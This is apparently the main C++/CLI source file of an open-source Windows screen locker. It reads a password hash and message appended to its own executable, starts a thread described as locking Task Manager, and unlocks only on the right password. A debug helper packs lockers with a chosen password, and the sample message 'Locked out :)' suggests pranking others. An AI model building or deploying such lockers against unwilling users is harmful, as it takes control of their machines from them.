/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#define MAX_PASSWORD_SIZE 16
#define PASSWORD_HASH_LENGTH 64
#define CHARACTERS_SEEK_BACK 88
#define MAX_READING_SIZE 90
#define SEARCH_OPENER '{'
#define SEARCH_CLOSER '}'

//#define DEBUG_MODE
#define MINIMIZE_WINDOWS

#ifdef DEBUG_MODE
	#define DUMMY_FILE "C:\\Users\\-\\Documents\\Visual Studio 2015\\Projects\\AHXR ScreenLock\\Debug\\test.exe"
	#define DUMMY_STUDIO_THIS_EXE "C:\\-\\-\\Documents\\Visual Studio 2015\\Projects\\AHXR ScreenLock\\Debug\\AHXRLocker.exe" 
	#define DUMMY_PASSWORD "hi"
	#define DUMMY_MESSAGE "Locked out :)"
#endif

static void comparePasswords(System::String ^ passwordInput);
static System::String ^ getMessage();

#include "windowMinimize.h"
#include "sha256.h"
#include "frmScreenLock.h"
#include "handleThread.h"

#include <string>
#include <fstream>
#include <iostream>
#include <msclr\marshal_cppstd.h>

using namespace System;
using namespace System::Windows::Forms;
using namespace msclr::interop;

static std::string 
	s_password,
	s_message
;

#ifdef DEBUG_MODE
static void packLocker(std::string fileName, std::string password, std::string message);
#endif

[STAThread]
int main() {

#ifdef DEBUG_MODE
	packLocker(DUMMY_FILE, DUMMY_PASSWORD, DUMMY_MESSAGE);

	// Attempting to open and read own .exe file.
	std::ifstream
		f_exe(DUMMY_FILE);
#else
	// Attempting to open and read own .exe file.
	wchar_t
		szExeFileName[MAX_PATH];

	GetModuleFileName(NULL, szExeFileName, MAX_PATH);

	std::wstring
		ws(szExeFileName);

	std::string
		s_fetch_dir(ws.begin(), ws.end());

	std::ifstream
		f_exe(s_fetch_dir);
#endif

	if (f_exe.is_open()) {

		/*
			Since executables are so long. We're going to first find the length of the file.
			The password and message are stored at the end of the file. It wouldn't make sense
			for me to read through every single character just to find something.
		*/
#ifdef DEBUG_MODE
		std::ifstream
			f_exe_l(DUMMY_FILE, std::ios::binary);
#else
		std::ifstream
			f_exe_l(s_fetch_dir, std::ios::binary);
#endif
		std::streamoff
			i_length;

		f_exe_l.seekg(0, std::ios::end); // Going to the end.
		i_length = f_exe_l.tellg(); // Length fetching.
		f_exe_l.close();
		
		/*
			Going back to our .exe file and setting the starting reading spot.
			
			But that reading spot is at the END of the file. So we're going to start at 
			the length of the file then go back 88 characters just so we can read from point A to B.

			After debugging outputs. 88 seems to be the lucky number to start at.
			( 20 MAX message length. SHA256 is 64 characters. Counting brackets too (4) )
		*/
		f_exe.seekg(i_length - CHARACTERS_SEEK_BACK);

		// Reading the file and converting it into a standard string.
		char 
			* c_search = new char[MAX_READING_SIZE];

		f_exe.read(c_search, CHARACTERS_SEEK_BACK);

		std::string 
			s_search(c_search, MAX_READING_SIZE);

		// Obtaining the password hash.
		size_t t_pw_open = s_search.find(SEARCH_OPENER);
		size_t t_pw_close = s_search.find(SEARCH_CLOSER);

		s_password = s_search.substr(t_pw_open + 1, PASSWORD_HASH_LENGTH); // Reading from start to 64 (SHA256 = 64 characters)

#ifdef DEBUG_MODE
		std::cout << s_password << "\r\n\r\n"; // Debugging the output.
#endif

		// Obtaining the message.
		size_t t_msg_open = s_search.find(SEARCH_OPENER, t_pw_close);
		size_t t_msg_close = s_search.find(SEARCH_CLOSER, t_msg_open);

		s_message = s_search.substr(t_msg_open + 1, t_msg_close - t_msg_open - 1); // Adjusting character positions.

#ifdef DEBUG_MODE
		std::cout << s_message << "\r\n\r\n"; // Debugging the output.
#endif

		f_exe.close();
		delete c_search;
	}
	else
		Application::Exit();

	// Starting the lockdown.
	startHandleThreading(); // Locking the program & taskmgr.
	//minimizeAllWindows();

	// Running the form.
	Application::EnableVisualStyles();
	Application::SetCompatibleTextRenderingDefault(false);
	AHXRLocker::frmScreenLock frm;
	Application::Run(%frm);	
	
	system("pause");
	return 0;
}


static void comparePasswords(String ^ passwordInput) {

	std::string
		s_input;

	s_input = marshal_as< std::string >(passwordInput);
	s_input = sha256(s_input);

	if (s_input.compare(s_password) == 0) {
		b_password_res = true;
		exit(1);
	}
}

static String ^ getMessage() {
	return gcnew String(s_message.c_str());
}

#ifdef DEBUG_MODE
	void packLocker(std::string fileName, std::string password, std::string message) {
		std::ifstream
			f_old;
		std::ofstream
			f_new;

		remove(DUMMY_FILE);

		f_old.open(DUMMY_STUDIO_THIS_EXE, std::ios::binary);
		f_new.open(DUMMY_FILE, std::ios::binary);

		f_new << f_old.rdbuf();

		f_old.close();
		f_new.close();

		std::fstream
			f_file;

		f_file.open(DUMMY_FILE, std::fstream::app);

		f_file << SEARCH_OPENER << sha256(password) << SEARCH_CLOSER;
		f_file << SEARCH_OPENER << message << SEARCH_CLOSER;

		f_file.close();
	}
#endif
